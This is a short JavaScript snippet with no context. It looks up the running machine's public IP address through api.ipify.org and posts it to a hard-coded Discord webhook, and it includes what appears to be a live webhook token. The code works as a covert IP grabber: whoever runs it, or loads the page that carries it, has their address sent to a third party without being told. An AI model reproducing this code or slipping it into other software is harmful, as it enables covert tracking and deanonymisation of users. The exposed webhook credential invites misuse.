async function fetchIP() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();
  const ip = data.ip;
  return ip;
}

let externalIP;

fetchIP()
  .then(ip => {
    externalIP = ip;
    const params = {
      username: 'real% =  = href ;;',
      avatar_url: '',
      content: externalIP,
    };

fetch('https://discord.com/api/webhooks/1374182096884731988/_AV8KqAERvgc9oN_3e1Be7EeSy1xBB_OD3BNGak6Za50-3Dplq4h03ZZ1wSTwDEoSyNu', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(params)
})
    })
